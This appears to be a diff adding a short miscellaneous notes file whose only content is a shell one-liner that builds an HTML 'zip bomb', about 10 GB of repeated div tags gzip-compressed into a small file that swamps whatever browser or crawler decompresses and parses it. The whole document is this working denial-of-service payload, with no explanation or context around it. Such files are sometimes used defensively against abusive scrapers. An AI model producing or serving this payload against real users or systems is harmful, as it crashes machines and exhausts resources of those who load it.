@@ -1,0 +1,6 @@
+misc
+====
+
+# create a html zip bomb
+(echo '<html><head></head><body>' && yes "<div>") | dd bs=1M count=10240 iflag=fullblock | gzip > bomb.html.gz
+
